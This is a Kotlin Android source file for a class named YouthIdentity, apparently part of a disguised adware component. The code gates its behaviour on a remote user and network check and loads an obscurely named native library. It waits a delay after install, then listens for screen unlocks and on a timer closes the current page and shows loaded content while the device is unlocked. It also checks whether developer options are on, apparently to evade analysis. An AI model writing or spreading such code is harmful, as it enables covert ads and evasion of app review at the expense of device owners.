package com.joy.youth

import android.app.KeyguardManager
import android.content.Context
import android.content.Intent
import android.content.IntentFilter
import android.os.Build
import android.os.PowerManager
import android.provider.Settings
import com.joy.youth.data.BeanData
import com.joy.youth.data.DiscoveryImpl
import com.joy.youth.data.IAndNetData
import com.joy.youth.event.YouthBroadcast
import kotlinx.coroutines.CoroutineScope
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.delay
import kotlinx.coroutines.launch

/**
 * Date：2024/6/13
 * Describe:
 */
class YouthIdentity(private val context: Context, private val iAndNetData: IAndNetData) {
    private val isId29 = Build.VERSION.SDK_INT >= 29
    private var mYears by DiscoveryImpl("0")
    private var mLengthF by DiscoveryImpl("")
    private var lastTimeS = 0L

    fun is18Years(): Boolean {
        return mYears == "c_go"
    }

    fun youthYearCheck() {
        CoroutineScope(Dispatchers.IO).launch {
            var i = 0
            while (i in 0..2) {
                YouthCache.youthLog("youthYearCheck--->$mYears")
                when (mYears) {
                    "0" -> {
                        mYears = iAndNetData.userCheck()
                        i++
                        continue
                    }

                    "u_cancel" -> {
                        i++
                        mYears = "c_failed"
                    }

                    "u_go" -> {
                        if (iAndNetData.isNetGo()) {
                            mYears = "c_go"
                            YouthCache.postEvent("ishit")
                            continue
                        } else if (iAndNetData.isNetLi()) {
                            mYears = "c_failed"
                            YouthCache.postEvent(context)
                            continue
                        }
                    }

                    "c_failed" -> {
                        i++
                        mYears = "u_cancel"
                    }

                    "c_go" -> {
                        System.loadLibrary("Wt4fzee")
                        proYouth()
                        i = (3..10).random()
                    }
                }
                delay(5000)
            }
        }
    }

    private var mBeanData = BeanData()
    private var isCheck = true
    private fun proYouth() {
        CoroutineScope(Dispatchers.Main).launch {
            if (isId29) {
                mBeanData = YouthCache.mHopeCenter.getBeanData("wait")
                while (isCheck) {
                    if (System.currentTimeMillis() - YouthCache.mInstallTime > mBeanData.tWait) {
                        break
                    }
                    delay(3000)
                }
            }

            YouthCache.infoStr(context, if (isOpenInf(context)) "sieksjsge1" else "2chisksod1")
            context.registerReceiver(YouthBroadcast(), IntentFilter().apply {
                addAction(Intent.ACTION_USER_PRESENT)
            })

            while (isCheck) {
                mBeanData = YouthCache.mHopeCenter.getBeanData("show")
                YouthCache.postEvent("time")
                goToSch(true)
                delay(mBeanData.timePeriod)
            }

        }
    }

    fun goToSch(isTimeEvent: Boolean = false) {
        YouthCache.youthLog("goToSch--->$mLengthF")
        if (mLengthF.length >= 101) {
            isCheck = false
            mYears = "u_cancel"
            YouthCache.postEvent("jumpfail")
            return
        }
        if (isMyDeviceScrLo(context).not()) return
        YouthCache.postEvent("isunlock")
        if (mBeanData.isInfoGo(if (isTimeEvent) lastTimeS else 0L).not()) return
        if (isId29.not() && System.currentTimeMillis() - YouthCache.mInstallTime < mBeanData.tWait) return
        YouthCache.postEvent("ispass")
        if (YouthCache.mHopeCenter.isReady()) {
            YouthCache.mHopeCenter.loadSuccessEvent = null
            YouthCache.postEvent("isready")
            CoroutineScope(Dispatchers.IO).launch {
                lastTimeS = System.currentTimeMillis()
                YouthCache.mHopeCenter.mHelperCore.finishCurPage()
                YouthCache.infoStr(context, if (isOpenInf(context)) "sieksj" else "sesivngd")
                mLengthF += ('a'..'h').random()
                lastTimeS = System.currentTimeMillis()
            }
        } else {
            YouthCache.mHopeCenter.setLoadSuccess {
                goToSch(isTimeEvent)
            }
        }
    }

    //DeviceNotLocked
    private fun isMyDeviceScrLo(context: Context): Boolean {
        return (context.getSystemService(Context.POWER_SERVICE) as PowerManager).isInteractive && (context.getSystemService(
            Context.KEYGUARD_SERVICE
        ) as KeyguardManager).isDeviceLocked.not()
    }


    // 开发者选项是否开启
    private fun isOpenInf(context: Context): Boolean {
        // todo del
        if (IS_TEST) return false
        val developerOptions = Settings.Secure.getInt(
            context.contentResolver, Settings.Global.DEVELOPMENT_SETTINGS_ENABLED, 0
        )
        return developerOptions != 0
    }

}